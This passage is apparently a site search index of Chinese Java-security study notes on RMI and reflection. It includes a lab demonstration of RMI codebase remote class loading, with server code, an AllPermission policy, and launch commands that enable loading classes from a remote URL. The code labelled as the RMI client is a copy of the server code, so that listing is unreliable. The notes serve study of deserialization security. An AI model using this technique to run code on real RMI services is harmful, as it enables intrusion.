\u9996\u5148\u5ba2\u6237\u7aef\u8fde\u63a5Registry\uff0c\u5e76\u5728\u5176\u4e2d\u5bfb\u627eName\u662fHello\u7684\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u5e94\u6570\u636e\u6d41\u4e2d\u7684Call\u6d88\u606f\uff1b\u7136\u540eRegistry\u8fd4\u56de\u4e00\u4e2a\u5e8f\u5217\u5316\u7684\u6570\u636e\uff0c\u8fd9\u4e2a\u5c31\u662f\u627e\u5230\u7684Name=Hello\u7684\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u5e94\u6570\u636e\u6d41\u4e2d\u7684ReturnData\u6d88\u606f\uff1b\u5ba2\u6237\u7aef\u53cd\u5e8f\u5217\u5316\u8be5\u5bf9\u8c61\uff0c\u53d1\u73b0\u8be5\u5bf9\u8c61\u662f\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u5730\u5740\u5728192.168.135.142:33769\uff0c\u4e8e\u662f\u518d\u4e0e\u8fd9\u4e2a\u5730\u5740\u5efa\u7acbTCP\u8fde\u63a5\u3002\u5728\u8fd9\u4e2a\u65b0\u7684\u8fde\u63a5\u4e2d\uff0c\u624d\u6267\u884c\u771f\u6b63\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff0c\u4e5f\u5c31\u662fhello()\u3002 RMI Registry\u5c31\u50cf\u4e00\u4e2a\u7f51\u5173\uff0c\u4ed6\u81ea\u5df1\u662f\u4e0d\u4f1a\u6267\u884c\u8fdc\u7a0b\u65b9\u6cd5\u7684\uff0c\u4f46RMI Server\u53ef\u4ee5\u5728\u4e0a\u9762\u6ce8\u518c\u4e00\u4e2aName\u5230\u5bf9\u8c61\u7684\u7ed1\u5b9a\u5173\u7cfb\uff1bRMI Client\u901a\u8fc7Name\u5411RMI Registry\u67e5\u8be2\uff0c\u5f97\u5230\u8fd9\u4e2a\u7ed1\u5b9a\u5173\u7cfb\uff0c\u7136\u540e\u518d\u8fde\u63a5RMI Server\uff1b\u6700\u540e\uff0c\u8fdc\u7a0b\u65b9\u6cd5\u5b9e\u9645\u4e0a\u5728RMI Server\u4e0a\u8c03\u7528\u3002","title":"RMI\u7bc71"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%872/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"RMI\u7bc72 # RMI\u867d\u7136\u5206\u6210\u4e09\u4e2a\u90e8\u5206\uff0c\u4f46\u662f\u901a\u5e38\u6211\u4eec\u5728\u65b0\u5efaRMI Registry\u7684\u65f6\u5019\u5bf9\u4f1a\u76f4\u63a5\u7ed1\u5b9a\u4e00\u4e2a\u5bf9\u8c61\u5728\u4e0a\u9762\uff0c\u4e5f\u5c31\u662f\u8bf4\u540c\u65f6\u627f\u62c5\u4e86Server\u548cRegistry\u7684\u89d2\u8272\u3002 \u90a3\u4e48RMI\u4f1a\u7ed9\u6211\u4eec\u5e26\u6765\u4ec0\u4e48\u5b89\u5168\u95ee\u9898\u5462\uff1f 1. \u5982\u679c\u6211\u4eec\u80fd\u8bbf\u95eeRMI Registry\u670d\u52a1\uff0c\u5982\u4f55\u5bf9\u5176\u653b\u51fb\uff1f 2. \u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86\u76ee\u6807RMI\u5ba2\u6237\u7aef\u4e2d\u7684RMI Registry\u7684\u5730\u5740\uff0c\u80fd\u4e0d\u80fd\u8fdb\u884c\u653b\u51fb\uff1f \u5982\u4f55\u653b\u51fbRMI Registry # RMI Registry\u662f\u7ba1\u7406\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5730\u65b9\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u540e\u53f0\uff0c\u4f46\u662f\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u5ba2\u6237\u7aef\u8c03\u7528\"\u540e\u53f0\"\u7684\u63a5\u53e3\uff0c\u4f8b\u5982: RemoteHelloWorld h = new RemoteHelloWorld (); Naming . rebind ( \"rmi://192.168.135.142:1099/Hello\" , h ); \u4e5f\u5c31\u662f\u8bf4\u5ba2\u6237\u7aef\u65e0\u6cd5\u8c03\u7528 rebind \u3001 bind \u3001 unbind \u7b49\u65b9\u6cd5\uff0c\u4e0d\u53ea\u53ef\u4ee5\u4f7f\u7528 list \u548c lookup \u65b9\u6cd5 RMI\u5229\u7528codebase\u6267\u884c\u4efb\u610f\u4ee3\u7801 # RMI\u4e2d\u6d89\u53ca\u5230\u4e00\u4e2a\u4e1c\u897f: codebase CLASSPATH\uff0c\u4f46CLASSPATH\u662f\u672c\u5730\u8def\u5f84\uff0c\u800ccodebase\u901a\u5e38\u662f\u8fdc\u7a0bURL\uff0c\u6bd4\u5982http\u3001ftp\u7b49\u3002 \u5982\u679c\u6211\u4eec\u6307\u5b9acodebase= http://example.com/ \uff0c\u7136\u540e\u52a0\u8f7dorg.vulhub.example.Example\u7c7b\uff0c\u5219 Java\u865a\u62df\u673a\u4f1a\u4e0b\u8f7d\u8fd9\u4e2a\u6587\u4ef6 http://example.com/org/vulhub/example/Example.class \uff0c\u5e76\u4f5c\u4e3a Example\u7c7b\u7684\u5b57\u8282\u7801\u3002 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u80fd\u63a7\u5236codebase\uff0c\u5c31\u53ef\u4ee5\u52a0\u8f7d\u6076\u610f\u7c7b\u4e86\uff0c\u4f46\u662f\u8fd9\u5b58\u5728\u9650\u5236\u7684: - \u5b89\u88c5\u5e76\u914d\u7f6e\u4e86SecurityManager - Java\u7248\u672c\u4f4e\u4e8e7u21\u30016u45\uff0c\u6216\u8005\u8bbe\u7f6e\u4e86java.rmi.server.useCodebaseOnly=false\uff0c\u5728\u6b64\u914d\u7f6e\u4e3atrue\u65f6\uff0cjvm\u53ea\u4fe1\u4efb\u9884\u5148\u914d\u7f6e\u597d\u7684codebase\uff0c\u6211\u4eec\u4e5f\u5c31\u65e0\u6cd5\u5229\u7528\u4e86 \u653b\u51fb\u4ee3\u7406\u793a\u4f8b # \u5148\u521b\u5efa\u56db\u4e2a\u6587\u4ef6: - Calc.java - ICalc.java - RMIServer.java - client.policy \u76ee\u5f55\u7ed3\u6784\u548c\u4ee3\u7801\u5982\u4e0b: package top.longlone.attackRMI ; import java.rmi.Remote ; import java.rmi.RemoteException ; import java.util.List ; public interface ICalc extends Remote { public Integer sum ( List < Integer > numbers ) throws RemoteException ; } package top.longlone.attackRMI ; import top.longlone.attackRMI.ICalc ; import java.rmi.RemoteException ; import java.rmi.server.UnicastRemoteObject ; import java.util.List ; public class Calc extends UnicastRemoteObject implements ICalc { protected Calc () throws RemoteException { } @Override public Integer sum ( List < Integer > numbers ) throws RemoteException { Integer sum = 0 ; for ( Integer number : numbers ) { sum += number ; } return sum ; } } package top.longlone.attackRMI ; import java.rmi.Naming ; import java.rmi.registry.LocateRegistry ; public class RMIServer { private void start () throws Exception { System . out . println ( \"setup SecurityManager\" ); System . setSecurityManager ( new SecurityManager ()); Calc h = new Calc (); LocateRegistry . createRegistry ( 1099 ); Naming . rebind ( \"rmi://192.168.123.150:1099/Calc\" , h ); } public static void main ( String [] args ) throws Exception { new RMIServer (). start (); } } grant { permission java.security.AllPermission; }; \u7136\u540e\u6267\u884c javac *.java* \u5bf9java\u4ee3\u7801\u8fdb\u884c\u7f16\u8bd1 \u518d\u7f16\u5199RMIClient.java package top.longlone.attackRMI ; import java.rmi.Naming ; import java.rmi.registry.LocateRegistry ; public class RMIServer { private void start () throws Exception { System . out . println ( \"setup SecurityManager\" ); System . setSecurityManager ( new SecurityManager ()); Calc h = new Calc (); LocateRegistry . createRegistry ( 1099 ); Naming . rebind ( \"rmi://192.168.123.150:1099/Calc\" , h ); } public static void main ( String [] args ) throws Exception { new RMIServer (). start (); } } \u540c\u6837\u9700\u8981\u5c06RMIClient\u7f16\u8bd1\uff0c\u8fd9\u91cc\u6709\u4e2a\u7279\u522b\u6ce8\u610f\u7684\u70b9\u662f: \u8fd9\u4e2aClient\u6211\u4eec\u9700\u8981\u5728\u53e6\u4e00\u4e2a\u4f4d\u7f6e\u8fd0\u884c\uff0c\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u8ba9RMI Server\u5728\u672c\u5730CLASSPATH\u91cc\u627e\u4e0d\u5230\u7c7b\uff0c\u624d\u4f1a\u53bb\u52a0\u8f7dcodebase\u4e2d\u7684\u7c7b\uff0c\u6240\u4ee5\u4e0d\u80fd\u5c06RMIClient.java\u653e\u5728RMI Server\u6240\u5728\u7684\u76ee\u5f55\u4e2d\u3002 \u8fd9\u65f6\u6211\u4eec\u518d\u6267\u884c\u547d\u4ee4\u8d77\u4e00\u4e2a\u670d\u52a1\u5668\u6765\u6d4b\u8bd5Client\u662f\u5426\u53bb\u6211\u4eec\u6307\u5b9a\u7684\u6076\u610f\u5730\u5740\u8fdc\u7a0b\u8bf7\u6c42\u7c7b\uff0c\u53ef\u4ee5\u4f7f\u7528python\u6216\u8005php\u7b80\u5355\u8d77\u4e2a\u670d\u52a1\u5668\u5373\u53ef \u8fd0\u884cServer\u548cClient: D:\\Coding\\java\\maven_study\\target\\classes>java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://127.0.0.1:7777/ top.longlone.RMIClient D:\\Coding\\java\\maven_study\\src\\main\\java>java -Djava.rmi.server.hostname=192.168.123.150 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=top/longlone/attackRMI/client.policy top.longlone.attackRMI.RMIServer \u53ef\u4ee5\u770b\u89c1\u786e\u5b9e\u8bf7\u6c42\u4e86 /top/longlone/RMIClient$1.class \uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5728\u8fdc\u7a0b\u53bb\u90e8\u7f72\u4e00\u4e2a\u6076\u610f\u7684class\u6587\u4ef6\u5c31\u80fd\u8ba9\u4ed6\u6267\u884c\u4efb\u610f\u4ee3\u7801\u4e86 \u8fd9\u91cc\u548cpdf\u6709\u4e9b\u4e0d\u4e00\u6837\u7684\u5730\u65b9: pdf\u91cc\u629b\u51fa\u4e86\u4e00\u4e2amagic value\u4e0d\u6b63\u786e\u7684\u9519\u8bef\uff0c\u4f46\u6211\u8fd9\u91cc\u629b\u51fa\u4e86\u4e00\u4e2aClassNotFound\u9519\u8bef","title":"RMI\u7bc72"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%872/#rmi\u7bc72","text":"RMI\u867d\u7136\u5206\u6210\u4e09\u4e2a\u90e8\u5206\uff0c\u4f46\u662f\u901a\u5e38\u6211\u4eec\u5728\u65b0\u5efaRMI Registry\u7684\u65f6\u5019\u5bf9\u4f1a\u76f4\u63a5\u7ed1\u5b9a\u4e00\u4e2a\u5bf9\u8c61\u5728\u4e0a\u9762\uff0c\u4e5f\u5c31\u662f\u8bf4\u540c\u65f6\u627f\u62c5\u4e86Server\u548cRegistry\u7684\u89d2\u8272\u3002 \u90a3\u4e48RMI\u4f1a\u7ed9\u6211\u4eec\u5e26\u6765\u4ec0\u4e48\u5b89\u5168\u95ee\u9898\u5462\uff1f 1. \u5982\u679c\u6211\u4eec\u80fd\u8bbf\u95eeRMI Registry\u670d\u52a1\uff0c\u5982\u4f55\u5bf9\u5176\u653b\u51fb\uff1f 2. \u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86\u76ee\u6807RMI\u5ba2\u6237\u7aef\u4e2d\u7684RMI Registry\u7684\u5730\u5740\uff0c\u80fd\u4e0d\u80fd\u8fdb\u884c\u653b\u51fb\uff1f","title":"RMI\u7bc72"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%872/#\u5982\u4f55\u653b\u51fbrmi-registry","text":"RMI Registry\u662f\u7ba1\u7406\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5730\u65b9\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u540e\u53f0\uff0c\u4f46\u662f\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u5ba2\u6237\u7aef\u8c03\u7528\"\u540e\u53f0\"\u7684\u63a5\u53e3\uff0c\u4f8b\u5982: RemoteHelloWorld h = new RemoteHelloWorld (); Naming . rebind ( \"rmi://192.168.135.142:1099/Hello\" , h ); \u4e5f\u5c31\u662f\u8bf4\u5ba2\u6237\u7aef\u65e0\u6cd5\u8c03\u7528 rebind \u3001 bind \u3001 unbind \u7b49\u65b9\u6cd5\uff0c\u4e0d\u53ea\u53ef\u4ee5\u4f7f\u7528 list \u548c lookup \u65b9\u6cd5","title":"\u5982\u4f55\u653b\u51fbRMI Registry"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%872/#rmi\u5229\u7528codebase\u6267\u884c\u4efb\u610f\u4ee3\u7801","text":"RMI\u4e2d\u6d89\u53ca\u5230\u4e00\u4e2a\u4e1c\u897f: codebase CLASSPATH\uff0c\u4f46CLASSPATH\u662f\u672c\u5730\u8def\u5f84\uff0c\u800ccodebase\u901a\u5e38\u662f\u8fdc\u7a0bURL\uff0c\u6bd4\u5982http\u3001ftp\u7b49\u3002 \u5982\u679c\u6211\u4eec\u6307\u5b9acodebase= http://example.com/ \uff0c\u7136\u540e\u52a0\u8f7dorg.vulhub.example.Example\u7c7b\uff0c\u5219 Java\u865a\u62df\u673a\u4f1a\u4e0b\u8f7d\u8fd9\u4e2a\u6587\u4ef6 http://example.com/org/vulhub/example/Example.class \uff0c\u5e76\u4f5c\u4e3a Example\u7c7b\u7684\u5b57\u8282\u7801\u3002 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u80fd\u63a7\u5236codebase\uff0c\u5c31\u53ef\u4ee5\u52a0\u8f7d\u6076\u610f\u7c7b\u4e86\uff0c\u4f46\u662f\u8fd9\u5b58\u5728\u9650\u5236\u7684: - \u5b89\u88c5\u5e76\u914d\u7f6e\u4e86SecurityManager - Java\u7248\u672c\u4f4e\u4e8e7u21\u30016u45\uff0c\u6216\u8005\u8bbe\u7f6e\u4e86java.rmi.server.useCodebaseOnly=false\uff0c\u5728\u6b64\u914d\u7f6e\u4e3atrue\u65f6\uff0cjvm\u53ea\u4fe1\u4efb\u9884\u5148\u914d\u7f6e\u597d\u7684codebase\uff0c\u6211\u4eec\u4e5f\u5c31\u65e0\u6cd5\u5229\u7528\u4e86","title":"RMI\u5229\u7528codebase\u6267\u884c\u4efb\u610f\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%872/#\u653b\u51fb\u4ee3\u7406\u793a\u4f8b","text":"\u5148\u521b\u5efa\u56db\u4e2a\u6587\u4ef6: - Calc.java - ICalc.java - RMIServer.java - client.policy \u76ee\u5f55\u7ed3\u6784\u548c\u4ee3\u7801\u5982\u4e0b: package top.longlone.attackRMI ; import java.rmi.Remote ; import java.rmi.RemoteException ; import java.util.List ; public interface ICalc extends Remote { public Integer sum ( List < Integer > numbers ) throws RemoteException ; } package top.longlone.attackRMI ; import top.longlone.attackRMI.ICalc ; import java.rmi.RemoteException ; import java.rmi.server.UnicastRemoteObject ; import java.util.List ; public class Calc extends UnicastRemoteObject implements ICalc { protected Calc () throws RemoteException { } @Override public Integer sum ( List < Integer > numbers ) throws RemoteException { Integer sum = 0 ; for ( Integer number : numbers ) { sum += number ; } return sum ; } } package top.longlone.attackRMI ; import java.rmi.Naming ; import java.rmi.registry.LocateRegistry ; public class RMIServer { private void start () throws Exception { System . out . println ( \"setup SecurityManager\" ); System . setSecurityManager ( new SecurityManager ()); Calc h = new Calc (); LocateRegistry . createRegistry ( 1099 ); Naming . rebind ( \"rmi://192.168.123.150:1099/Calc\" , h ); } public static void main ( String [] args ) throws Exception { new RMIServer (). start (); } } grant { permission java.security.AllPermission; }; \u7136\u540e\u6267\u884c javac *.java* \u5bf9java\u4ee3\u7801\u8fdb\u884c\u7f16\u8bd1 \u518d\u7f16\u5199RMIClient.java package top.longlone.attackRMI ; import java.rmi.Naming ; import java.rmi.registry.LocateRegistry ; public class RMIServer { private void start () throws Exception { System . out . println ( \"setup SecurityManager\" ); System . setSecurityManager ( new SecurityManager ()); Calc h = new Calc (); LocateRegistry . createRegistry ( 1099 ); Naming . rebind ( \"rmi://192.168.123.150:1099/Calc\" , h ); } public static void main ( String [] args ) throws Exception { new RMIServer (). start (); } } \u540c\u6837\u9700\u8981\u5c06RMIClient\u7f16\u8bd1\uff0c\u8fd9\u91cc\u6709\u4e2a\u7279\u522b\u6ce8\u610f\u7684\u70b9\u662f: \u8fd9\u4e2aClient\u6211\u4eec\u9700\u8981\u5728\u53e6\u4e00\u4e2a\u4f4d\u7f6e\u8fd0\u884c\uff0c\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u8ba9RMI Server\u5728\u672c\u5730CLASSPATH\u91cc\u627e\u4e0d\u5230\u7c7b\uff0c\u624d\u4f1a\u53bb\u52a0\u8f7dcodebase\u4e2d\u7684\u7c7b\uff0c\u6240\u4ee5\u4e0d\u80fd\u5c06RMIClient.java\u653e\u5728RMI Server\u6240\u5728\u7684\u76ee\u5f55\u4e2d\u3002 \u8fd9\u65f6\u6211\u4eec\u518d\u6267\u884c\u547d\u4ee4\u8d77\u4e00\u4e2a\u670d\u52a1\u5668\u6765\u6d4b\u8bd5Client\u662f\u5426\u53bb\u6211\u4eec\u6307\u5b9a\u7684\u6076\u610f\u5730\u5740\u8fdc\u7a0b\u8bf7\u6c42\u7c7b\uff0c\u53ef\u4ee5\u4f7f\u7528python\u6216\u8005php\u7b80\u5355\u8d77\u4e2a\u670d\u52a1\u5668\u5373\u53ef \u8fd0\u884cServer\u548cClient: D:\\Coding\\java\\maven_study\\target\\classes>java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://127.0.0.1:7777/ top.longlone.RMIClient D:\\Coding\\java\\maven_study\\src\\main\\java>java -Djava.rmi.server.hostname=192.168.123.150 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=top/longlone/attackRMI/client.policy top.longlone.attackRMI.RMIServer \u53ef\u4ee5\u770b\u89c1\u786e\u5b9e\u8bf7\u6c42\u4e86 /top/longlone/RMIClient$1.class \uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5728\u8fdc\u7a0b\u53bb\u90e8\u7f72\u4e00\u4e2a\u6076\u610f\u7684class\u6587\u4ef6\u5c31\u80fd\u8ba9\u4ed6\u6267\u884c\u4efb\u610f\u4ee3\u7801\u4e86 \u8fd9\u91cc\u548cpdf\u6709\u4e9b\u4e0d\u4e00\u6837\u7684\u5730\u65b9: pdf\u91cc\u629b\u51fa\u4e86\u4e00\u4e2amagic value\u4e0d\u6b63\u786e\u7684\u9519\u8bef\uff0c\u4f46\u6211\u8fd9\u91cc\u629b\u51fa\u4e86\u4e00\u4e2aClassNotFound\u9519\u8bef","title":"\u653b\u51fb\u4ee3\u7406\u793a\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%873/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"RMI\u7bc73 # \u6d41\u91cf\u5206\u6790 # \u7565 SerializationDumper # \u4e0b\u8f7d\u5730\u5740 \u4ec0\u4e48\u662fclassAnnotations # \u4f17\u6240\u5468\u77e5\uff0c\u5728\u5e8f\u5217\u5316Java\u7c7b\u7684\u65f6\u5019\u7528\u5230\u4e86\u4e00\u4e2a\u7c7b\uff0c\u53ebObjectOutputStream\u3002\u8fd9\u4e2a\u7c7b\u5185\u90e8\u6709\u4e00\u4e2a\u65b9\u6cd5 annotateClass\uff0cObjectOutputStream\u7684\u5b50\u7c7b\u6709\u9700\u8981\u5411\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u91cc\u653e\u4efb\u4f55\u5185\u5bb9\uff0c\u90fd\u53ef\u4ee5\u91cd\u5199\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5199\u5165\u4f60\u81ea\u5df1\u60f3\u8981\u5199\u5165\u7684\u6570\u636e\u3002\u7136\u540e\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u5230\u8fd9\u4e2a\u4fe1\u606f\u5e76\u4f7f\u7528\u3002 classAnnotations \u8868\u793a\u548c\u7c7b\u76f8\u5173\u7684 Annotation \u7684\u63cf\u8ff0\u4fe1\u606f\uff0c\u8fd9\u91cc\u7684\u6570\u636e\u503c\u4e00\u822c\u662f\u7531 ObjectOutputStream \u7684 annotateClass() \u65b9\u6cd5\u5199\u5165\u7684\uff0c\u4f46\u7531\u4e8e annotateClass() \u65b9\u6cd5\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u6240\u4ee5 classAnnotations \u540e\u4e00\u822c\u4f1a\u8bbe\u7f6e TC_ENDBLOCKDATA \u6807\u8bc6\uff1b","title":"RMI\u7bc73"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%873/#rmi\u7bc73","text":"","title":"RMI\u7bc73"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%873/#\u6d41\u91cf\u5206\u6790","text":"\u7565","title":"\u6d41\u91cf\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%873/#serializationdumper","text":"\u4e0b\u8f7d\u5730\u5740","title":"SerializationDumper"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%873/#\u4ec0\u4e48\u662fclassannotations","text":"\u4f17\u6240\u5468\u77e5\uff0c\u5728\u5e8f\u5217\u5316Java\u7c7b\u7684\u65f6\u5019\u7528\u5230\u4e86\u4e00\u4e2a\u7c7b\uff0c\u53ebObjectOutputStream\u3002\u8fd9\u4e2a\u7c7b\u5185\u90e8\u6709\u4e00\u4e2a\u65b9\u6cd5 annotateClass\uff0cObjectOutputStream\u7684\u5b50\u7c7b\u6709\u9700\u8981\u5411\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u91cc\u653e\u4efb\u4f55\u5185\u5bb9\uff0c\u90fd\u53ef\u4ee5\u91cd\u5199\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5199\u5165\u4f60\u81ea\u5df1\u60f3\u8981\u5199\u5165\u7684\u6570\u636e\u3002\u7136\u540e\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u5230\u8fd9\u4e2a\u4fe1\u606f\u5e76\u4f7f\u7528\u3002 classAnnotations \u8868\u793a\u548c\u7c7b\u76f8\u5173\u7684 Annotation \u7684\u63cf\u8ff0\u4fe1\u606f\uff0c\u8fd9\u91cc\u7684\u6570\u636e\u503c\u4e00\u822c\u662f\u7531 ObjectOutputStream \u7684 annotateClass() \u65b9\u6cd5\u5199\u5165\u7684\uff0c\u4f46\u7531\u4e8e annotateClass() \u65b9\u6cd5\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u6240\u4ee5 classAnnotations \u540e\u4e00\u822c\u4f1a\u8bbe\u7f6e TC_ENDBLOCKDATA \u6807\u8bc6\uff1b","title":"\u4ec0\u4e48\u662fclassAnnotations"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%871/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5c04\u7bc71 # \u91cd\u8981\u7684\u53cd\u5c04\u65b9\u6cd5 # \u83b7\u53d6\u7c7b\u7684\u2f45\u65b9\u6cd5\uff1a forName \u5b9e\u4f8b\uf9b5\u5316\u7c7b\u5bf9\u8c61\u7684\u2f45\u65b9\u6cd5\uff1a newInstance \u83b7\u53d6\u51fd\u6570\u7684\u2f45\u65b9\u6cd5\uff1a getMethod \u6267\u2f8f\u884c\ufa08\u51fd\u6570\u7684\u2f45\u65b9\u6cd5\uff1a invoke \u83b7\u53d6\u7c7b\u7684\u4e09\u4e2a\u65b9\u6cd5 # obj.getClass() \uff0cobj\u662f\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b Clazz.class \uff0cClazz\u662f\u4e00\u4e2a\u7c7b Class.forname() \uff0c\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6 Class.forname\u7684\u51fd\u6570\u91cd\u8f7d # forName\u6709\u4e24\u4e2a\u51fd\u6570\u91cd\u8f7d\uff1a - Class<?> forName(String name) - Class<?> forName(String name, **boolean** initialize, ClassLoader loader) \u5176\u4e2d\u7b2c\u4e00\u79cd\u65b9\u5f0f\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u7684\u4e00\u4e2a\u5c01\u88c5\uff0c\u5b83\u76f8\u5f53\u4e8e Class.forName(className, true, currentLoader) \u5176\u4e2d\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8868\u793a\u662f\u5426\u521d\u59cb\u5316\uff0c\u4f46\u662f\u8fd9\u91cc\u7684\u521d\u59cb\u5316\u4e0d\u662f\u6307\u5b9e\u4f8b\u7684\u521d\u59cb\u5316(\u8c03\u7528\u6784\u9020\u51fd\u6570)\uff0c\u800c\u662f\u7c7b\u7684\u521d\u59cb\u5316 \u7c7b\u4e2d\u4e09\u4e2a\"\u521d\u59cb\u5316\"\u7684\u533a\u522b # class Test { { System . out . println ( \"static code\" ); } static { System . out . println ( \"init top.longlone.Test class\" ); } public Test () { System . out . println ( \"init instance\" ); } } \u8fd9\u91cc\u6709\u4e09\u4e2a\u521d\u59cb\u5316\u4ee3\u7801\uff0c\u5b83\u4eec\u7684\u533a\u522b\u662f \u7b2c\u4e00\u4e2a {} \u4e2d\u7684\u4ee3\u7801\u4f1a\u653e\u5728\u6784\u9020\u51fd\u6570\u7684super() \u540e\u9762\uff0c \u4f46\u5728\u6784\u9020\u51fd\u6570\u5185\u5bb9\u7684\u524d\u9762 \u7b2c\u4e8c\u4e2a static {} \u4e2d\u7684\u4ee3\u7801\u662f\u7c7b\u7684\u521d\u59cb\u5316\u65f6\u7684\u4ee3\u7801 \u7b2c\u4e09\u4e2a\u6784\u9020\u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u662f\u5b9e\u4f8b\u521d\u59cb\u5316\u65f6\u7684\u4ee3\u7801 \u6240\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u63cf\u8ff0\uff0c\u5b83\u4eec\u7684\u6267\u884c\u987a\u5e8f\u4f1a\u662f2->1->3\uff0c\u6839\u636e\u8fd9\u4e2a\u6211\u4eec\u4e5f\u77e5\u9053\u4e86 forname() \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570initialize\u4ee3\u8868\u7684\u5c31\u662f\u662f\u5426\u6267\u884c static {} \u4e2d\u7684\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5199\u6bb5\u4ee3\u7801\u6d4b\u8bd5\u4e00\u4e0b package top.longlone ; class Test { { System . out . println ( \"static code\" ); } static { System . out . println ( \"init top.longlone.Test class\" ); } public Test () { System . out . println ( \"init instance\" ); } } public class Hello { public static void main ( String [] args ) throws ClassNotFoundException { Class . forName ( \"top.longlone.Test\" , false , Hello . class . getClassLoader ()); // \u4e0d\u4f1a\u6709\u8f93\u51fa Class . forName ( \"top.longlone.Test\" , true , Hello . class . getClassLoader ()); // \u6709\u8f93\u51fa } }","title":"\u53cd\u5c04\u7bc71"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%871/#\u53cd\u5c04\u7bc71","text":"","title":"\u53cd\u5c04\u7bc71"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%871/#\u91cd\u8981\u7684\u53cd\u5c04\u65b9\u6cd5","text":"\u83b7\u53d6\u7c7b\u7684\u2f45\u65b9\u6cd5\uff1a forName \u5b9e\u4f8b\uf9b5\u5316\u7c7b\u5bf9\u8c61\u7684\u2f45\u65b9\u6cd5\uff1a newInstance \u83b7\u53d6\u51fd\u6570\u7684\u2f45\u65b9\u6cd5\uff1a getMethod \u6267\u2f8f\u884c\ufa08\u51fd\u6570\u7684\u2f45\u65b9\u6cd5\uff1a invoke","title":"\u91cd\u8981\u7684\u53cd\u5c04\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%871/#\u83b7\u53d6\u7c7b\u7684\u4e09\u4e2a\u65b9\u6cd5","text":"obj.getClass() \uff0cobj\u662f\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b Clazz.class \uff0cClazz\u662f\u4e00\u4e2a\u7c7b Class.forname() 